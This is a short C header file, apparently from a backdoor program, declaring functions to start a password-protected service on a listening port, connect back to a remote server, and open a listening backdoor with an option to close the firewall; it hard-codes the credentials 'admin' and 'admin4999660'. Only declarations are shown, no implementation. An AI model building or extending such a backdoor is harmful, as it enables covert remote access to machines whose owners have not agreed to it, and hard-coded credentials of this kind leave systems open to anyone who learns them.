#ifndef _BACKDOOR_
#define _BACKDOOR_

#define USERNAME "admin"
#define PASSWORD "admin4999660"

int start_service(char *usr, char *pwd, unsigned short listenPort);
int conn_back_to_server(char *servIP, unsigned short servPort);
int start_listen_backdoor(int closeFirewall);

#endif //_BACKDOOR_
